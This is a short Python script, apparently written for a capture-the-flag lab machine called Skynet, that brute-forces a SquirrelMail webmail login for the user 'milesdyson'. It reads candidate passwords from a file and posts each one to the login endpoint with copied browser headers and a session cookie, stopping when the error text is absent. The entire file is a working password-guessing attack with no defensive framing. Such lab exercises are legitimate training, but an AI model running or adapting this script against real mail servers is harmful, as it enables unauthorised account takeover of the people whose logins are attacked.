import requests
from colorama import Fore
import pyfiglet


ascii_round = pyfiglet.figlet_format("=============")
ascii_banner = pyfiglet.figlet_format("This is BAAS' hydra!")
print(Fore.LIGHTBLUE_EX)
print(ascii_round)
print(Fore.BLUE)
print(ascii_banner)
print(Fore.LIGHTBLUE_EX)
print(ascii_round)
print(Fore.YELLOW)
print("Through SMB we know that the username is 'milesdyson'")
print("Let's try all our password that we've gianed through SMB")
print("\n\nBruteforcing Skynet: ...")

filename = 'log1.txt'
username = 'milesdyson'
password_list = []
cookies = {
	'SQMSESSID': '8b1omjt4prlbvl4b0atv3pmvp0',
}

headers = {
	'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
	'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
	'Accept-Language': 'en-US,en;q=0.5',
	# 'Accept-Encoding': 'gzip, deflate',
	'Content-Type': 'application/x-www-form-urlencoded',
	'Origin': 'http://10.10.98.68',
	'Connection': 'keep-alive',
	'Referer': 'http://10.10.98.68/squirrelmail/src/login.php',
	# 'Cookie': 'SQMSESSID=8b1omjt4prlbvl4b0atv3pmvp0',
	'Upgrade-Insecure-Requests': '1',
}

for item in open(filename):
	password_list.append(item.strip())



for password in password_list:
	data = {
    	'login_username': username,
    	'secretkey': password,
    	'js_autodetect_results': '1',
    	'just_logged_in': '1',
	}

	response = requests.post('http://10.10.98.68/squirrelmail/src/redirect.php', cookies=cookies, headers=headers, data=data)
	if "Unknown user or password incorrect" in response.text:
    	print(Fore.RED)
    	print(f"\nthis password: {password} is incorrect!")

	else:
    	print(Fore.GREEN)
    	print(f"\nthis password: {password} is correct!!")
    	break
